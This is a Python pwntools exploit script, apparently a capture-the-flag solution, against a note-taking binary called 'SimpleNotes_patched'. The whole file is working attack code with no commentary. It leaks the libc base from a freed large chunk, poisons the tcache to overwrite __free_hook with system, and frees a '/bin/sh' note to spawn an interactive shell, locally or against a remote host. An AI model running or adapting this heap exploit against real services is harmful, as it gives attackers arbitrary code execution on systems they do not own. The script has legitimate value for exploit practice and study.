#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('SimpleNotes_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def create_note(idx, size, data):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"note:", str(idx).encode())
    io.sendlineafter(b"note:", str(size).encode())
    io.sendafter(b"note:", data)


def edit_note(idx, size, data):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b"note:", str(idx).encode())
    io.sendlineafter(b"note:", str(size).encode())
    io.sendafter(b"note:", data)


def delete_note(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b"note:", str(idx).encode())


def read_note(idx):
    io.sendlineafter(b">>", b"4")
    io.sendlineafter(b"note:", str(idx).encode())


def init():
    global io

    io = start()


def solve():


    create_note(0, 0x500, b"A"*8)
    create_note(1, 0x10, b"B"*8)
    delete_note(0)
    create_note(3, 0x500, b"C")
    read_note(3)
    leak = u64((b"\xa0" + io.recvline()[2:7]).ljust(8, b'\x00')) - 0x3ebca0
    libc.address = leak
    info("libc base: %#x", libc.address)

    create_note(4, 0x20, b"tcache")
    create_note(5, 0x20, b"poisoning")

    delete_note(4)
    delete_note(5)
    edit_note(5, 0x8, p64(libc.sym["__free_hook"]))

    create_note(5, 0x20, b"/bin/sh\x00")
    create_note(6, 0x20, p64(libc.sym["system"]))

    delete_note(5)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

